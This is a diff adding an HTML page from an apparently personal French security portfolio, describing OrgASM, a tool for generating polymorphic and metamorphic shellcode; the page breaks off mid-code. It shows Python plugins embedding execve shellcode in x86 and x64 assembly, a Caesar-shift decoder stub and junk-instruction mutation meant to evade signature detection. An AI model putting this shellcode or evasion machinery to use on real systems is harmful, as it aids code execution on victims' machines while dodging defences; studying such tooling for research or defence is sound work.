@@ -1,0 +1,869 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-7.0.6">
+    
+    
+      
+        <title>Sécurité offensive - Mélodie Bouffier</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.2c0c5eaf.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.7fa14f5b.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#00bdd6">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="cyan" data-md-color-accent="">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#securite-offensive" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Mélodie Bouffier" class="md-header__button md-logo" aria-label="Mélodie Bouffier" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Mélodie Bouffier
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Sécurité offensive
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    <div class="md-header__options">
+      
+    </div>
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Mélodie Bouffier" class="md-nav__button md-logo" aria-label="Mélodie Bouffier" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Mélodie Bouffier
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        Table des matières
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cti/" class="md-nav__link">
+        Threat intelligence
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Sécurité offensive
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Sécurité offensive
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#orgasm" class="md-nav__link">
+    OrgASM
+  </a>
+  
+    <nav class="md-nav" aria-label="OrgASM">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    Description
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#apercu" class="md-nav__link">
+    Aperçu
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fonctionnement" class="md-nav__link">
+    Fonctionnement
+  </a>
+  
+    <nav class="md-nav" aria-label="Fonctionnement">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#donnees-dynamiques" class="md-nav__link">
+    Données dynamiques
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#polymorphisme" class="md-nav__link">
+    Polymorphisme
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metamorphisme" class="md-nav__link">
+    Metamorphisme
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confort" class="md-nav__link">
+    Confort
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../defsec/" class="md-nav__link">
+        Sécurité défensive
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ctf/" class="md-nav__link">
+        CTF
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#orgasm" class="md-nav__link">
+    OrgASM
+  </a>
+  
+    <nav class="md-nav" aria-label="OrgASM">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    Description
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#apercu" class="md-nav__link">
+    Aperçu
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fonctionnement" class="md-nav__link">
+    Fonctionnement
+  </a>
+  
+    <nav class="md-nav" aria-label="Fonctionnement">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#donnees-dynamiques" class="md-nav__link">
+    Données dynamiques
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#polymorphisme" class="md-nav__link">
+    Polymorphisme
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metamorphisme" class="md-nav__link">
+    Metamorphisme
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confort" class="md-nav__link">
+    Confort
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="securite-offensive">Sécurité offensive<a class="headerlink" href="#securite-offensive" title="Permanent link">#</a></h1>
+<h2 id="orgasm">OrgASM<a class="headerlink" href="#orgasm" title="Permanent link">#</a></h2>
+<p><img alt="OrgASM Welcome" src="/assets/offsec/orgasm/media/welcome.png" /></p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<ul>
+<li>Source : <a href="https://gitlab.com/Alvoras/orgasm">https://gitlab.com/Alvoras/orgasm</a></li>
+<li>Langage : Python, C, NASM</li>
+</ul>
+</div>
+<h3 id="description">Description<a class="headerlink" href="#description" title="Permanent link">#</a></h3>
+<p>OrgASM est un outil en ligne de commande interactif qui permet de générer des shellcodes poly- et metamorphique.</p>
+<p>Il propose également une gamme d'outils facilitant le développement, le test et le débug de shellcode.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Le plugin de payload supporte à la fois le code source NASM et les shellcode sous leurs formes hexadécimale.</p>
+<p>En revanche, le moteur en charge du métamorphisme ne supporte que la première forme.</p>
+</div>
+<h3 id="apercu">Aperçu<a class="headerlink" href="#apercu" title="Permanent link">#</a></h3>
+<p><center>
+    <video alt="OrgASM Demo" width="100%" controls>
+      <source src="/assets/offsec/orgasm/media/demo.webm" type="video/webm">
+    Your browser does not support the video tag.
+    </video>
+</center></p>
+<h3 id="fonctionnement">Fonctionnement<a class="headerlink" href="#fonctionnement" title="Permanent link">#</a></h3>
+<p>La fondation du fonctionnement de cet outil est le découpage de ce qui constitue un shellcode en briques qu'il est possible manipuler et de combiner de manière indépendante.</p>
+<p>Nous retrouvons ainsi un système de plugin différent pour :</p>
+<ul>
+<li>Le payload</li>
+<li>La données à insérer dynamiquement</li>
+<li>Le polymorphisme</li>
+<li>Le metamorphisme</li>
+</ul>
+<h4 id="payload">Payload<a class="headerlink" href="#payload" title="Permanent link">#</a></h4>
+<p>La création d'un plugin de payload se résume à renseigner un template pour chaque architecture puis enregistrer les patchers et les modules de métamorphismes utilisés.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">modules.payload.base</span> <span class="kn">import</span> <span class="n">BasePayload</span>
+<span class="kn">from</span> <span class="nn">modules.patcher.ascii_data</span> <span class="kn">import</span> <span class="n">AsciiData</span>
+<span class="kn">from</span> <span class="nn">modules.patcher.ascii_len</span> <span class="kn">import</span> <span class="n">AsciiLen</span>
+
+<span class="kn">from</span> <span class="nn">modules.meta.metaengine</span> <span class="kn">import</span> <span class="n">MetaEngine</span>
+<span class="kn">from</span> <span class="nn">modules.meta.junk</span> <span class="kn">import</span> <span class="n">Junk</span>
+<span class="kn">from</span> <span class="nn">modules.meta.zero</span> <span class="kn">import</span> <span class="n">Zero</span>
+
+
+<span class="k">class</span> <span class="nc">ExecvePayload</span><span class="p">(</span><span class="n">BasePayload</span><span class="p">):</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">state</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;Execve&quot;</span>
+
+        <span class="c1"># Add the patcher&#39;s options to the payload</span>
+        <span class="c1"># Here the AsciiData adds the &quot;data&quot; option</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">add_patcher_options</span><span class="p">(</span><span class="n">AsciiData</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">add_patcher</span><span class="p">(</span><span class="n">AsciiData</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">payload_32</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="c1"># Register the metmorphic plugins used</span>
+        <span class="n">meta</span> <span class="o">=</span> <span class="n">MetaEngine</span><span class="p">()</span>
+        <span class="n">meta</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Junk</span><span class="p">)</span>
+        <span class="n">meta</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Zero</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="sa">fr</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">global _start:</span>
+
+<span class="s2">_start:</span>
+<span class="s2">    ; Pick a random alterations and patch it on the fly</span>
+<span class="s2">    </span><span class="si">{</span><span class="n">meta</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="s1">&#39;zero&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">reg1</span><span class="o">=</span><span class="s1">&#39;eax&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">    push eax</span>
+<span class="s2">    ; Insert the placeholder that will be replaced by the value of the &quot;data&quot; option</span>
+<span class="s2">    </span><span class="si">{</span><span class="n">AsciiData</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">    ; Add some random junk</span>
+<span class="s2">    </span><span class="si">{</span><span class="n">meta</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="s1">&#39;junk&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">    mov ebx,esp</span>
+<span class="s2">    mov ecx,eax</span>
+<span class="s2">    mov edx,eax</span>
+<span class="s2">    mov al, 0x0b</span>
+<span class="s2">    mov ebx, esp</span>
+<span class="s2">    int 0x80</span>
+<span class="s2">    </span><span class="si">{</span><span class="n">meta</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="s1">&#39;zero&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">reg1</span><span class="o">=</span><span class="s1">&#39;eax&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">    inc eax</span>
+<span class="s2">    int 0x80</span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+    <span class="c1"># The same goes for the x64 template</span>
+    <span class="k">def</span> <span class="nf">payload_64</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">meta</span> <span class="o">=</span> <span class="n">MetaEngine</span><span class="p">()</span>
+        <span class="n">meta</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Junk</span><span class="p">)</span>
+        <span class="n">meta</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Zero</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="sa">fr</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">global _start:</span>
+
+<span class="s2">_start:</span>
+<span class="s2">    </span><span class="si">{</span><span class="n">meta</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="s1">&#39;zero&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">reg1</span><span class="o">=</span><span class="s1">&#39;eax&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">    push   0x42</span>
+<span class="s2">    pop    rax</span>
+<span class="s2">    inc    ah</span>
+<span class="s2">    cqo</span>
+<span class="s2">    push   rdx</span>
+<span class="s2">    </span><span class="si">{</span><span class="n">AsciiData</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">    </span><span class="si">{</span><span class="n">meta</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="s1">&#39;junk&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">    push   rsp</span>
+<span class="s2">    pop    rsi</span>
+<span class="s2">    mov    r8, rdx</span>
+<span class="s2">    mov    r10, rdx</span>
+<span class="s2">    syscall</span>
+<span class="s2">&quot;&quot;&quot;</span>
+</code></pre></div>
+<h4 id="donnees-dynamiques">Données dynamiques<a class="headerlink" href="#donnees-dynamiques" title="Permanent link">#</a></h4>
+<p>Les données à intégrer au shellcode de manière dynamique sont gérées par les <code>patchers</code>.</p>
+<p>Leur fonctionnement est simple : leur seul rôle est renvoyer la donnée par laquelle remplacer le placeholder présent dans le template.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">modules.patcher.base</span> <span class="kn">import</span> <span class="n">BasePatcher</span>
+
+
+<span class="k">class</span> <span class="nc">AsciiLen</span><span class="p">(</span><span class="n">BasePatcher</span><span class="p">):</span>
+    <span class="c1"># Template placeholder</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;$ASCII_LEN$&quot;</span>
+
+    <span class="c1"># &quot;patch_shellcode&quot; is set upstream to signal</span>
+    <span class="c1"># that we&#39;re patching either raw shellcode or NASM source code</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">patch_shellcode</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">patch_shellcode</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">apply</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">options</span><span class="p">,</span> <span class="n">encoded_payload</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">)),</span> <span class="s2">&quot;02x&quot;</span><span class="p">)</span>  <span class="c1"># ex : 1a</span>
+
+        <span class="c1"># We need to add an &quot;h&quot; to the end of the hex string if we&#39;re</span>
+        <span class="c1"># patching a source code template</span>
+        <span class="c1"># ie. 08h</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">patch_with</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">patch_shellcode</span>
+            <span class="k">else</span> <span class="bp">self</span><span class="o">.</span><span class="n">patch_with</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">h&quot;</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="polymorphisme">Polymorphisme<a class="headerlink" href="#polymorphisme" title="Permanent link">#</a></h4>
+<p>Le polymorphisme est pris en charge par les <code>encoders</code>. </p>
+<p>Analogues aux payloads, il est également possible d'intégrer des instructions métamorphiques au sein du template.</p>
+<p>Après avoir été encodé via la fonction <code>encode_byte</code>, le payload est placé à la suite du décodeur.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">modules.encoder.base</span> <span class="kn">import</span> <span class="n">BaseEncoder</span>
+<span class="kn">from</span> <span class="nn">modules.meta.metaengine</span> <span class="kn">import</span> <span class="n">MetaEngine</span>
+<span class="kn">from</span> <span class="nn">modules.meta.zero</span> <span class="kn">import</span> <span class="n">Zero</span>
+<span class="kn">from</span> <span class="nn">modules.meta.junk</span> <span class="kn">import</span> <span class="n">Junk</span>
+<span class="kn">from</span> <span class="nn">modules.patcher.shellcode_len</span> <span class="kn">import</span> <span class="n">ShellcodeLen</span>
+<span class="kn">from</span> <span class="nn">modules.patcher.offset</span> <span class="kn">import</span> <span class="n">Offset</span>
+
+
+<span class="k">class</span> <span class="nc">CaesarMetaEncoder</span><span class="p">(</span><span class="n">BaseEncoder</span><span class="p">):</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">state</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;Caesar metamorphic&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">add_patcher_options</span><span class="p">(</span><span class="n">Offset</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">add_patcher</span><span class="p">(</span><span class="n">Offset</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">add_patcher</span><span class="p">(</span><span class="n">ShellcodeLen</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">decoder_32</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">meta</span> <span class="o">=</span> <span class="n">MetaEngine</span><span class="p">()</span>
+        <span class="n">meta</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Junk</span><span class="p">)</span>
+        <span class="n">meta</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Zero</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="sa">rf</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">section .text</span>
+
+<span class="s2">global _start:</span>
+
+<span class="s2">_start:</span>
+<span class="s2">   jmp    one</span>
+<span class="s2">   </span><span class="si">{</span><span class="n">meta</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="s1">&#39;junk&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+
+<span class="s2">four:</span>
+<span class="s2">   pop    esi</span>
+<span class="s2">   </span><span class="si">{</span><span class="n">meta</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="s1">&#39;zero&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">reg1</span><span class="o">=</span><span class="s1">&#39;ecx&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">   mov    cl,</span><span class="si">{</span><span class="n">ShellcodeLen</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2"></span>
+
+<span class="s2">two:</span>
+<span class="s2">   sub    BYTE [esi+ecx-1],</span><span class="si">{</span><span class="n">Offset</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">   sub    cl,1</span>
+<span class="s2">   jne    two</span>
+<span class="s2">   jmp    three</span>
+
+<span class="s2">one:</span>
+<span class="s2">   call   four</span>
+
+<span class="s2">three:</span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">decoder_64</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sa">rf</span><span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">section .text</span>
+
+<span class="s2">global _start:</span>
+
+<span class="s2">_start:</span>
+<span class="s2">   jmp    one</span>
+
+<span class="s2">four:</span>
+<span class="s2">   pop    rsi</span>
+<span class="s2">   xor    rcx, rcx</span>
+<span class="s2">   mov    cl,</span><span class="si">{</span><span class="n">ShellcodeLen</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2"></span>
+
+<span class="s2">two:</span>
+<span class="s2">   sub    BYTE [rsi+rcx-1],</span><span class="si">{</span><span class="n">Offset</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s2"></span>
+<span class="s2">   sub    cl,0x1</span>
+<span class="s2">   jne    two</span>
+<span class="s2">   jmp    three</span>
+
+<span class="s2">one:</span>
+<span class="s2">   call   four</span>
+
+<span class="s2">three:</span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">encode_byte</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">op</span><span class="p">):</span>
+        <span class="n">encoded</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">op</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;offset&quot;</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span><span class="p">,</span> <span class="s2">&quot;02x&quot;</span><span class="p">)</span>
+        <span class="n">encoded_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">encoded</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">encoded_hex</span>
+
+    <span class="k">def</span> <span class="nf">decode_byte</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">op</span><span class="p">):</span>
+        <span class="n">decoded</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">op</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;offset&quot;</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span><span class="p">,</span> <span class="s2">&quot;02x&quot;</span><span class="p">)</span>
+        <span class="n">decoded_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">decoded</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">decoded_hex</span>
+</code></pre></div>
+<p>Les fonctions d'encodage et de décodage peuvent également être utilisées depuis l'interface sur un shellcode brute :</p>
+<p><center>
+    <video alt="OrgASM Demo" width="100%" controls>
+      <source src="/assets/offsec/orgasm/media/encode_decode.webm" type="video/webm">
+    Your browser does not support the video tag.
+    </video>
+</center></p>
+<h4 id="metamorphisme">Metamorphisme<a class="headerlink" href="#metamorphisme" title="Permanent link">#</a></h4>
+<p>Les plugins servant à implémenter le metamorphisme se résument à un nom et aux templates des altérations possibles :</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">modules.meta.base</span> <span class="kn">import</span> <span class="n">BasePlugin</span>
+
+
+<span class="k">class</span> <span class="nc">Zero</span><span class="p">(</span><span class="n">BasePlugin</span><span class="p">):</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;zero&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">alterations</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&quot;32&quot;</span><span class="p">:</span> <span class="p">[</span>
+                <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;xor &lt;reg1&gt;, &lt;reg1&gt;&quot;</span><span class="p">],</span>
